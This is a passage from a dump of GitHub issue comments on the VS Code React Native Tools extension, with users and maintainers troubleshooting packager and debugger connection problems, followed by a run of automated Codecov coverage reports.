error.. Hmm.\nSo I tried again with my actual project and I still had the err could not connect issues.\nThen I tried breakpoints on a blank project that I had created previously. I no longer got the connection issues. Debugging would start, but it wouldn't stop on any of the breakpoints despite breakpoints being listed as verified.\nI then recreated the blank project, and everything was working on that.\nI'm attempting to upgrade my actual project to React 0.47.1 to see if that makes any difference. Currently it isn't building and I'm having issues with npm install that I'm trying to work through.\nSo for the debugging itself, I suspect it's...something with my actual project, be it my code, xcodeproj problems, or one of my dependencies. I'm just not sure how to actually go about debugging it.. I'm good! Upgrading and clearing everything in the project itself seemed to have worked! I had to remove package-lock.json as well, which was apparently causing me a lot of issues.\nThanks!. ",
    "quincycs": "Looks like updating my node to 7.6.0 fixed this.. I also have ran into this.  I can reproduce by just running brand new exponent app made by XDE (choose the tab navigation sample).  The blank sample runs fine.. Thanks guys.  @axemclion looks great.  I'm happy with any path that makes the integration work long term without being brittle.  Obviously exponent / CRNA changes very often.. ",
    "nathanpiper": "Just updated my branch.. ",
    "ciceroneves": "Thanks @vladimir-kotikov!\nSorry for the delay as well. That worked fine!. ",
    "Firgeis": "Hi @matrosov-nikita , thanks for the response!\nThis solved my problem.. ",
    "wenzhiwang": "@axemclion Excellent blog and video. I can successfully remotely debug the code within VS, however, it causes the same issue when I use socket.io. \nhttps://github.com/react-community/create-react-native-app/issues/133#issuecomment-292050965\nClient side code\n```javascript\nwindow.navigator.userAgent = \"react-native\";\nconst io = require('socket.io-client/dist/socket.io');\n// Must specifiy 'jsonp: false' since react native doesn't provide the dom and\n// thus wouldn't support creating an iframe/script tag\nconst socket = io('https://015780b2.ngrok.io', {\n  jsonp: false,\n  transports: ['websocket'] // you need to explicitly tell it to use websockets\n});\n`. ",
    "ButuzGOL": "thx . i have removed trace: true and it disappeared thx. ",
    "Jarrio": "This does not seem to work for me? I've added \"react-native-tools\": {\n        \"projectRoot\": \"./bin\"\n    } to my settings.json file and it still says \"Current workspace is not a React native project.\"\n. I did multiple times\nOn 20 Oct 2017 11:35, \"Artem Egorov\" notifications@github.com wrote:\n\nHi @Jarrio https://github.com/jarrio\nCould you please restart your vscode after added setting and then check\nagain?\nThanks!\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/424#issuecomment-338170775,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAtsDX6vINxHCUkguxt5LbsEF_7Kw3Wsks5suHdzgaJpZM4MhVhZ\n.\n. @svekl That is exactly where I have it, is there perhaps a thing I need to setup in my react native project specifically?\n\n\nsimply doing cd bin react-native start works as expected for me so not sure why this isn't picking up the react-native-tools directory\nI did also try with ./bin I just figured the direct path wouldn't leave anything to the imagination. Not sure why, but I tried to start the packager again just now and it seems to have picked it up fine. Apologies! Earlier today I did set the REACT_EDITOR=code as a system variable but that's all I've changed with my setup today.. I appreciate that! I have created a basic project and have pre-compiled for both android and ios as I wasn't sure which target you're on (the ios one might be missing some console.log statements as I forgot to re-compile it when I added them for that target).\nI assume that these console.log statements should be re-routed to the debugger if everything is working correctly, right?\nI had to create a repo for it due to the whole project size.. Ah that's got it connected! What's the intended use of the debugger? As a test I threw some RawText in my Render and it errors in app but the debugger doesn't respond to it, is that intended and is just meant to print the output in the LogCat Output?. I'm not sure why but since updating to 0.5 I cannot get the packager to connect at all now, the following is in the output:\n```\n[Error] Failed to start the React Native packager\nStack: TypeError: Failed to start the React Native packager: Cannot read property 'message' of undefined\n    at Function.getWrappedError (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\src\\common\\error\\internalError.js:35:16)\n    at Function.wrapError (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\src\\common\\error\\errorHelper.js:18:44)\n    at resultOfCode.done.reason (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\src\\common\\entryPointHandler.js:40:72)\n    at _rejected (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:844:24)\n    at C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:870:30\n    at Promise.when (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:1122:31)\n    at Promise.promise.promiseDispatch (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:788:41)\n    at C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:604:44\n    at runSingle (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:137:13)\n    at flush (C:\\Users\\Jazz.vscode\\extensions\\vsmobile.vscode-react-native-0.5.0\\node_modules\\q\\q.js:125:13)\n``. Every time I start the packager it says[Error] Current workspace is not a React Native project.` and then starts up anyway and works fine. I'm not sure what I'm doing wrong but I can't get the debugger to connect to vscode at all.\nMy output just shows the following when attempting to connect via the debugger\n```\nStarting custom debugger by executing: echo A debugger is not needed:  \"w:\\HaxeReact\\Alarm\\bin\"\n[Info] Packager is already running.\nStarting custom debugger by executing: echo A debugger is not needed:  \"w:\\HaxeReact\\Alarm\\bin\"\nand the app just times out after a little bit. In the debug console I get\nOS: win32 x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.4\n``\nAnd the following from the developer tools:\n![image](https://user-images.githubusercontent.com/748557/32380946-58dd2a2e-c0a9-11e7-92ce-9bd65f44b19d.png)\n. I actually experience the same issues on that project as well. I can start the packager but it still says \"Current project isn't a React-Native Project\", I can't runReact Native: Run on Android Devicevia the vscodeF1` menu and putting the app in debug mode it just never connects to the debugger and eventually times out. Oh hey! That worked in the sample project and didn't in my other. Turns out I had a slight mis-spelling for the parameter in my settings.json file. I appreciate all the help, thanks!. ",
    "svekl": "Hi @Jarrio, can you, please, tell, where your settings.json is located? You need to put it in .vscode folder in your root folder, not subfolder with RN project. I just tried to reproduce, but it seems working fine to me.. Hi @deadrats, thank you for your comment, can you, please, provide us some more info? What file did you have as a soft link? I'm asking because I was not able to make RN packager to work with soft links. . Hi @deadrats, thanks for provided details.\nI see you had an issue with Python project, but this is a React Native Tools extension repository, I think you meant to report to https://github.com/Microsoft/vscode/ ?. I see a bug in extension, looks like it doesn't respect port setting in launch.json for attach to packager case. I will create a PR with fix now.\nMeanwhile, as a quick workaround, you can set \"react-native.packager.port\": 19001 in settings.json\nBy the way, did you try to run packager from our extension directly? We have Debug in Exponent launch configuration, that runs packager, attaches to it and provides you a QR code for Expo.. @jhalborg If I understand right, you need to attach two chrome debuggers to same packager? If yes - then it's not possible.\nSo, I think, you have to use some separate redux tools without debugger to be able to debug in VSCode and use redux tools at the same time.. I googled a bit and found some extension, never used it and not sure if it even works, but did you try it?\nhttps://marketplace.visualstudio.com/items?itemName=jingkaizhao.vscode-redux-devtools. Yeah, thanks for report! =). Hi @Jarrio, \nlaunchReactNative.js file is not needed, so it's ok, that it doesn't exist, it is just a placeholder to satisfy VS Code limitation and is not used.\nYour issue is that debuggerWorker.js file is not downloaded from packager to w:\\HaxeReact\\Crashdex\\haxe\\.vscode\\.react\\debuggerWorker.js\nBut I tried to reproduce that today in many ways and had no success. May I, please, ask you to create some example minimum project, where this issue is reproduced?. Hi @Jarrio,\nthank you for an example, took a look and realized that I was partially wrong. File from program parameter is not used, but it's path is used. So, the only change in your project that I need to do to make it work is to return back\n\"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\ninstead of \n\"program\": \"${workspaceRoot}/bin/generated/android/main.js\",\nin \"Debug Android\" in launch.json. Hi @Jarrio,\ndebugger is intended to work fine, including breakpoints, watches, debug console and other stuff. But for debugger to work, all RN syntax must be correct, or packager won't be able to work with that. So, if you will just throw some random text it's not gonna work.\nBut playing with your project I found a bug that breaks debugging for Haxe project on Windows machine, breakpoints are not working in .hx files even with correct project. I created a PR with fix, so, it will be included in some release soon.\nAs I see, you have an experience in VS Code extensions authoring, so you can not to wait for release and test fixed debugger behavior from master branch, PR is already merged. If you are interested in testing - here is contribution guide which might help you with setup https://github.com/Microsoft/vscode-react-native/blob/master/CONTRIBUTING.md\nThanks again for your report and example project, it helped a lot!. Checked 0.5 with your sample project, looks like this issue is related to other changes, merged fix, new version is released, now works fine with your sample project.. Hi @Jarrio,\ntried to reproduce your issue on this repo https://github.com/Jarrio/Haxe-React-Native-blank-project, but for me debugging works fine, the only change I have is \n\"name\": \"Debug Android\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\nCan you, please, try to reproduce it on this project? And also, please, check your settings.json projectRoot parameter\n\"react-native-tools\": {\n        \"projectRoot\": \"./bin\"\n    }. @Jarrio, ok, I see, what you mean, thanks, I get an error on React Native: Run on Android Device too. Can you try not to use React Native: Run on Android Device for now, but just use Debug Android from Debug tab? I mean without running packager, it will launch it by itself. As regards to error, that you had with React Native: Run on Android Device command and attaching to packager, it will be fixed after merge of #587\nThanks for reporting.. lgtm. Hi @wprater, thanks for reporting! RN packager moved debuggerWorker.js to /debugger-ui/ in 0.50.0, and this fix was introduced to extension, but I see haul packager didn't, so created PR #593 to fix your issue.. @iTOYS LGTM. @iTOYS Please, take a look. @iTOYS LGTM. @sargant Hi, thanks for report. I see your issue and will provide a fix today. Meanwhile, as a quick workaround you can add empty \"devDependencies\": {} to your package.json.. Provided fix in #602. @iTOYS Please, take a look. Hi @fcaride,\nsure, you need to use Attach to packager for that. For example let's say you run your app on another port like that\nreact-native run-android --port 11111\nso, you will need to add port Attach to packager configuration in launch.json, it will look like that\n{\n            \"name\": \"Attach to packager\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"attach\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n            \"port\": \"11111\"\n        }\nthen after attaching you can set a breakpoint in your app, Enable Remote JS Debugging and Reload your RN app from it's dev menu and debug session will start.\n. @fcaride, may I ask you to create some small project that reproduces this issue to test? And to provide a command that you are using to run packager. I'm asking because there are a lot of possible set ups of RN apps and I tried to eject expo on my project and had no luck in reproducing.\nBy the way, did you try to run packager from our extension directly? We have Debug in Exponent launch configuration, that runs packager, attaches to it and provides you a QR code for Expo.. Awesome, glad to hear it works, you are welcome!. @fcaride, Now I see what your issue was and what I was doing wrong trying to reproduce it, you can see details and workaround here\nhttps://github.com/Microsoft/vscode-react-native/issues/553#issuecomment-348531053. @egorshulga Can you, please, show output from yarn global list?. @iTOYS Looks good. changed here\nhttps://github.com/Microsoft/vscode-react-native/pull/554/commits/b16e0e9cab895d50afe5b9fde42de832b301e6d6. ",
    "cooolan00p": "yup... that did the trick... thanx. ",
    "anp": "Hey! We can definitely chat on slack, but the basic rundown is:\nExpo has a fork of RN where we sometimes land fixes to JS before they're available in a stable release. We maintain compatibility with the npm version of React Native for CRNA, but when you're running in exp or XDE, we warn you since you may not have all of the appropriate bugfixes. That said, as long as the sdkVersion flag is set to a compatible ABI for your RN install, things should just work.\nAFAIK the only case where we require use of our fork is for apps using ExpoKit, because we bundle some native code in the npm package which our tools expect to configure as part of the Xcode/Android Studio builds.. ",
    "rdickert": "It appears expo support is broken if you are using a current version for your app. When I try to run the debugger, I get warnings about invalid exp.json keys that are currently supported (like privacy and icon). I also get Warning: Installed version 0.40.0 of 'react-native' does not satify required version git+https://github.com/exponentjs/react-native#sdk-13.0.0\\n\\n\nThe debugger output ends with \"Error starting tunnel: Error: {\\\"status_code\\\":400,\\\"msg\\\":\\\"failed to deserialize request parameter\\\",\\\"details\\\":{\\\"err\\\":{\\\"Type\\\":{}}}}\"\n{\"status_code\":400,\"msg\":\"failed to deserialize request parameter\",\"details\":{\"err\":{\"Type\":{}}}} and the debug console output is \n[vscode-react-native] Starting Exponent Packager.\n[Error] \"Could not debug. An error ocurred while handling message: START_EXPONENT_PACKAGER\"\nI can submit a new issue if you think this is a separate bug, but I'm assuming this might be resolved with the updates planned.. ",
    "kkganesan": "@vladimir-kotikov using version 0.3.2 with expo xde, there is no file called launchReactNative.js in .vscode. \nexpo package.json\n\"@expo/ex-navigation\": \"~2.9.2\",\n    \"@expo/samples\": \"~1.0.3\",\n    \"expo\": \"^15.0.2\",\n    \"react\": \"~15.4.0\",\n    \"react-native\": \"https://github.com/exponent/react-native/archive/sdk-15.0.0.tar.gz\"\nsame outcome using create-react-native cmd line.. ",
    "lflserg": "@kkganesan  Debugging should work without it as I read in different thread. The only problem is re-downloading expo`s version of react native which takes much time.. ",
    "GollyJer": "Hi guys.  I'm really struggling to get debugging working with an existing Expo app.\nI'll start with the question I realize I need to ask more often...\nShould I expect this to work if I'm running Windows 10?. Thanks @panarasi and @vladimir-kotikov.\nAny help is greatly appreciated.. Hi @vladimir-kotikov.  I have my React Native app running via the Expo XDE.  The code is open in VSCode.  In VSCode I go to the DEBUG window and select \"Debug in Exponent\" and click the run button. \nThen I get the following error in the debug console.\n[Error] \"Could not debug. Unable to set up communication with VSCode react-native extension. Is this a react-native project, and have you made sure that the react-native npm package is installed at the root?\". @vladimir-kotikov I'm going to look at this as soon as I get a chance.  We're on vacation at the moment... back on the 12th, but may be able to take a look before if I get some time alone.\nI know I don't have react-native-cli installed.  I'll do that and then run through the instructions again.. Hi @vladimir-kotikov.  Just wanted to follow up and let you know I got this working great with Expo.\nInstalling react-native packager globally did the trick.\nreact-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.46.1\n. \"working great\" may have been an overstatement. \ud83d\ude1b \nIt starts, and I'm able to debug, but working with it today I often get a debug adapter error and have to restart vscode and my app in Expo.\n\n. @vladimir-kotikov Are you guys close to the next release?  I'm anxious for the fix. \ud83d\ude03 . ",
    "gautifaldessai": ":\\Users\\Gautam Faldessai\\Desktop\\Brushflicks1\\mstore.3.1\\mstore-pro>react-native run-android\nScanning 563 folders for symlinks in C:\\Users\\Gautam Faldessai\\Desktop\\Brushflicks1\\mstore.3.1\\mstore-pro\\node_modules (36ms)\nJS server already running.\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug)...\nUnzipping C:\\Users\\Gautam Faldessai.gradle\\wrapper\\dists\\gradle-2.14.1-all\\8bnwg5hd3w55iofp58khbp6yv\\gradle-2.14.1-all.zip to C:\\Users\\Gautam Faldessai.gradle\\wrapper\\dists\\gradle-2.14.1-all\\8bnwg5hd3w55iofp58khbp6yv\nException in thread \"main\" java.util.zip.ZipException: error in opening zip file\n        at java.util.zip.ZipFile.open(Native Method)\n        at java.util.zip.ZipFile.(Unknown Source)\n        at java.util.zip.ZipFile.(Unknown Source)\n        at java.util.zip.ZipFile.(Unknown Source)\n        at org.gradle.wrapper.Install.unzip(Install.java:159)\n        at org.gradle.wrapper.Install.access$500(Install.java:26)\n        at org.gradle.wrapper.Install$1.call(Install.java:69)\n        at org.gradle.wrapper.Install$1.call(Install.java:46)\n        at org.gradle.wrapper.ExclusiveFileAccessManager.access(ExclusiveFileAccessManager.java:65)\n        at org.gradle.wrapper.Install.createDist(Install.java:46)\n        at org.gradle.wrapper.WrapperExecutor.execute(WrapperExecutor.java:126)\n        at org.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:61)\nCould not install the app on the device, read the error above for details.\nMake sure you have an Android emulator running or a device connected and have\nset up your Android development environment:\nhttps://facebook.github.io/react-native/docs/android-setup.html. already plugged in a physical device..still the error persist. adb device shows the list of devices attached\n. ",
    "jpshelley": "@vladimir-kotikov thanks for the input! I've recently moved away from react-native work for the time being. Feel free to keep this open or close it depending on what Microsoft thinks is best. Good to know it would still work in case others were having the same issue.. ",
    "galkahana": "+1. ",
    "gchiacchio": "+1. ",
    "peterp": "Howdy folks, I appreciate the +1 comments here in support, but let's try not to flood the maintainers, use the handy \ud83d\udc4d  thumbs-up emoji on the bottom left corner to show your support!. ",
    "TomSwift": "I added support for \"scheme\" in this PR:  https://github.com/Microsoft/vscode-react-native/pull/444. I noticed the copyright-check failing locally for me even sans my changes, so I disabled it.   On inspection, it looks like the routine checks for the copyright to be at position 0 in the file, but the file is being transformed and \"use strict\" being placed before the copyright notice.   It's not clear to me how or why this is happening.. ",
    "terbooter": "@jt100xu ,\ncould you try run this project from console using react-native-cli\nreact-native run-android. ",
    "jwtea": "@jt100xu \nI was having a similar problem after debugging on a physical device. What i did to fix was:\nClose vscode\nrun in terminal adb forward --remove-all\nreopen vscode and run debug android with the emulator running. Hope this helps. ",
    "xiemeilong": "same issue +1. ",
    "mindrage": "Awesome!, this been troubling me alot lately, done alot of changes to some config files to just workaround for some location feedback (going after stacktraces).\nJust for clarification when/if this is done, could you possibly link a gist or something of the [tsconfig.json, .babelrc, jsconfig.json, package.json] from the example you tested/confirmed it on?\n. Any updates on this? Wouldn't mind attempt to try to track this down myself, but is there any more information revealed about this issue?. Is this completely unsolvable? It's feels like it's been still for quite a while. \nHavent really been able to find a solution to this yet myself, anyone gotten any further progress with this?. ",
    "tslearn": "exciting, this issue troubles me a lot.. Me too,  breakpoints not hit.  OS platform: MacOS 10.12.4. ",
    "markmadlangbayan": "Any word on this?  I'm having the same issue with a sample code.. ",
    "codecov-io": "Codecov Report\n\nMerging #442 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@          Coverage Diff           @@\nmaster    #442   +/-\n======================================\n  Coverage    1.62%   1.62%         \n======================================\n  Files          65      65         \n  Lines        3329    3329         \n  Branches      392     392         \n======================================\n  Hits           54      54         \n  Misses       3275    3275\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 5c8365a...31bc1a9. Read the comment docs.\n. # Codecov Report\n:exclamation: No coverage uploaded for pull request base (master@94cd514). Click here to learn what that means.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster     #490   +/-\n=========================================\n  Coverage          ?   33.27%         \n=========================================\n  Files             ?       65         \n  Lines             ?     3318         \n  Branches          ?      383         \n=========================================\n  Hits              ?     1104         \n  Misses            ?     2212         \n  Partials          ?        2\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 94cd514...40fb6b6. Read the comment docs.\n. # Codecov Report\nMerging #491 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #491   +/-\n=======================================\n  Coverage   33.27%   33.27%         \n=======================================\n  Files          65       65         \n  Lines        3318     3318         \n  Branches      383      383         \n=======================================\n  Hits         1104     1104         \n  Misses       2212     2212         \n  Partials        2        2\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 28d8458...546cf35. Read the comment docs.\n. # Codecov Report\nMerging #493 into master will increase coverage by 0.81%.\nThe diff coverage is 81.81%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #493      +/-\n==========================================\n+ Coverage   33.87%   34.68%   +0.81%   \n==========================================\n  Files          65       65            \n  Lines        3312     3321       +9   \n  Branches      382      385       +3   \n==========================================\n+ Hits         1122     1152      +30   \n+ Misses       2188     2167      -21   \n  Partials        2        2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/sourceMapsCombinator.ts | 91.83% <81.81%> (+54.33%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4254046...cbed0b4. Read the comment docs.\n. # Codecov Report\nMerging #494 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #494   +/-\n=======================================\n  Coverage   33.27%   33.27%         \n=======================================\n  Files          65       65         \n  Lines        3318     3318         \n  Branches      383      383         \n=======================================\n  Hits         1104     1104         \n  Misses       2212     2212         \n  Partials        2        2\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2331a74...d9513c4. Read the comment docs.\n. # Codecov Report\nMerging #495 into master will increase coverage by 0.39%.\nThe diff coverage is 7.69%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #495      +/-\n==========================================\n+ Coverage   33.27%   33.66%   +0.39%   \n==========================================\n  Files          65       65            \n  Lines        3318     3312       -6   \n  Branches      383      382       -1   \n==========================================\n+ Hits         1104     1115      +11   \n+ Misses       2212     2195      -17   \n  Partials        2        2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/exponent/xdlInterface.ts | 34.48% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.3% <0%> (-0.23%) | :arrow_down: |\n| src/common/node/request.ts | 18.75% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/scriptImporter.ts | 29.62% <0%> (\u00f8) | :arrow_up: |\n| src/common/packager.ts | 22.98% <16.66%> (+6.87%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e7eb54a...487a40a. Read the comment docs.\n. # Codecov Report\nMerging #502 into master will increase coverage by 0.21%.\nThe diff coverage is 25%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #502      +/-\n==========================================\n+ Coverage   33.66%   33.87%   +0.21%   \n==========================================\n  Files          65       65            \n  Lines        3312     3312            \n  Branches      382      382            \n==========================================\n+ Hits         1115     1122       +7   \n+ Misses       2195     2188       -7   \n  Partials        2        2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/commandExecutor.ts | 44.44% <100%> (+3.03%) | :arrow_up: |\n| src/common/hostPlatform.ts | 33.75% <0%> (+5%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 833e37c...e390ca0. Read the comment docs.\n. # Codecov Report\nMerging #505 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@          Coverage Diff           @@\nmaster    #505   +/-\n======================================\n  Coverage    1.62%   1.62%         \n======================================\n  Files          65      65         \n  Lines        3321    3321         \n  Branches      385     385         \n======================================\n  Hits           54      54         \n  Misses       3267    3267\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 396b662...57aa211. Read the comment docs.\n. # Codecov Report\nMerging #506 into master will decrease coverage by 33.06%.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster    #506       +/-\n==========================================\n- Coverage   34.68%   1.62%   -33.07%   \n==========================================\n  Files          65      65             \n  Lines        3321    3321             \n  Branches      385     385             \n==========================================\n- Hits         1152      54     -1098   \n- Misses       2167    3267     +1100   \n+ Partials        2       0        -2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/outputVerifier.ts | 0% <0%> (-100%) | :arrow_down: |\n| src/common/extensionMessaging.ts | 0% <0%> (-100%) | :arrow_down: |\n| src/common/node/crypto.ts | 0% <0%> (-100%) | :arrow_down: |\n| src/common/node/node.ts | 0% <0%> (-100%) | :arrow_down: |\n| src/common/error/internalErrorCode.ts | 0% <0%> (-100%) | :arrow_down: |\n| src/common/ios/xcodeproj.ts | 0% <0%> (-94.74%) | :arrow_down: |\n| src/common/interProcessMessageSender.ts | 0% <0%> (-94.6%) | :arrow_down: |\n| src/common/node/childProcess.ts | 0% <0%> (-93.94%) | :arrow_down: |\n| src/debugger/sourceMap.ts | 0% <0%> (-90.48%) | :arrow_down: |\n| src/common/ios/simulatorPlist.ts | 0% <0%> (-89.66%) | :arrow_down: |\n| ... and 31 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9f75364...c9946c9. Read the comment docs.\n. # Codecov Report\nMerging #507 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #507      +/-\n=========================================\n- Coverage    1.62%   1.62%   -0.01%   \n=========================================\n  Files          65      65            \n  Lines        3321    3329       +8   \n  Branches      385     392       +7   \n=========================================\n  Hits           54      54            \n- Misses       3267    3275       +8\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/remoteExtension.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/telemetry.ts | 5.38% <0%> (+0.04%) | :arrow_up: |\n| src/common/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/appWorker.ts | 0.92% <0%> (-0.01%) | :arrow_down: |\n| src/common/telemetryHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/scriptImporter.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/error/errorHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/sourceMap.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/commandExecutor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| ... and 23 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8580a17...3688b37. Read the comment docs.\n. # Codecov Report\nMerging #508 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@          Coverage Diff           @@\nmaster    #508   +/-\n======================================\n  Coverage    1.62%   1.62%         \n======================================\n  Files          65      65         \n  Lines        3321    3321         \n  Branches      385     385         \n======================================\n  Hits           54      54         \n  Misses       3267    3267\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 57fea36...5ebca45. Read the comment docs.\n. # Codecov Report\nMerging #509 into master will increase coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #509      +/-\n=========================================\n+ Coverage    1.62%   1.62%   +<.01%   \n=========================================\n  Files          65      66       +1   \n  Lines        3329    3326       -3   \n  Branches      392     391       -1   \n=========================================\n  Hits           54      54            \n+ Misses       3275    3272       -3\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/sourceMapsCombinator.ts | 3.84% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/extension/outputChannelLogger.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/exponent/exponentHelper.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/ios/xcodeproj.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.9% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/ios/plistBuddy.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/targetPlatformHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/node/fileSystem.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/telemetryGenerators.ts | 0% <0%> (\u00f8) | |\n| ... and 16 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 10bc532...0fbb351. Read the comment docs.\n. # Codecov Report\nMerging #510 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #510      +/-\n=========================================\n- Coverage    1.62%   1.61%   -0.01%   \n=========================================\n  Files          66      66            \n  Lines        3326    3334       +8   \n  Branches      391     393       +2   \n=========================================\n  Hits           54      54            \n- Misses       3272    3280       +8\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/debugger/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/ios/iOSDebugModeManager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/ios/plistBuddy.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2771019...d1544a4. Read the comment docs.\n. # Codecov Report\nMerging #512 into master will decrease coverage by 0.01%.\nThe diff coverage is 1.63%.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #512      +/-\n========================================\n- Coverage    1.61%   1.6%   -0.02%   \n========================================\n  Files          66     66            \n  Lines        3334   3359      +25   \n  Branches      393    397       +4   \n========================================\n  Hits           54     54            \n- Misses       3280   3305      +25\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/extensionMessaging.ts | 